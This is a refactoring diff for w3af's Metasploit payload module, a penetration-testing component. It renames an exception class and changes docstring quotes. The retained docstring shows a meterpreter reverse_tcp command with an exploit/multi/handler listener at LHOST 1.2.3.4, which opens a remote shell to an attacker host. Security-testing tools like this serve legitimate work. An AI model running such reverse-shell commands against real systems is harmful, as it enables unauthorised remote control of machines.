@@ -1,10 +1,10 @@
 from w3af.plugins.attack.payloads.base_payload import Payload
 from w3af.core.controllers.vdaemon.vdFactory import get_virtual_daemon
-from w3af.core.controllers.exceptions import w3afException
+from w3af.core.controllers.exceptions import BaseFrameworkException
 
 
 class metasploit(Payload):
-    '''
+    """
     This payload interacts with the metasploit framework.
 
     Usage:
@@ -17,11 +17,11 @@ class metasploit(Payload):
 
     A complete example looks like this:
         linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E
-    '''
+    """
     def api_execute(self, msf_args):
         try:
             vd = get_virtual_daemon(self.shell.execute)
-        except w3afException, w3:
+        except BaseFrameworkException, w3:
             return 'Error, %s' % w3
         else:
             vd.run(msf_args)
